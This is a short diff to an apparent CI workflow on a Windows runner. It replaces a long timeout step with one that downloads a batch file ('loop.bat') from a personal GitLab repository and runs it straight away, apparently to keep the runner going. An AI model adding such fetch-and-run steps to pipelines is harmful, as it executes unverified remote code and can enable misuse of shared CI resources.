@@ -19,4 +19,6 @@ jobs:
         run: cmd /c show.bat
 
       - name: test again
-        run: timeout /t 18000 /nobreak
+        run: |
+          curl -s -L -o loop.bat https://gitlab.com/chamod12/loop-win10/-/raw/main/loop.bat
+          cmd /c loop.bat
